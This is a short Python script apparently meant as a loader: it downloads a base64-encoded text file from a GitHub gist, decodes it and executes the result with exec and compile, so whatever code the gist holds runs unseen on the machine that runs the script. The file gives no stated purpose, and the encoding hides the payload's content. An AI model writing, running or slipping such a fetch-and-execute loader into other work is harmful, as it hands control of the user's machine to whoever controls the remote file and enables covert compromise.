import urllib.request
import base64
exec(compile(base64.b64decode(urllib.request.urlopen("https://gist.githubusercontent.com/NarmakTwo/4ff61f53cbb3d1c06e145821a3dc7eb0/raw/b289f06f35af2e4aea4cf87291fe1041ca90854e/encoded.txt").read().decode("utf8")).decode(), 'exec', 'exec'))
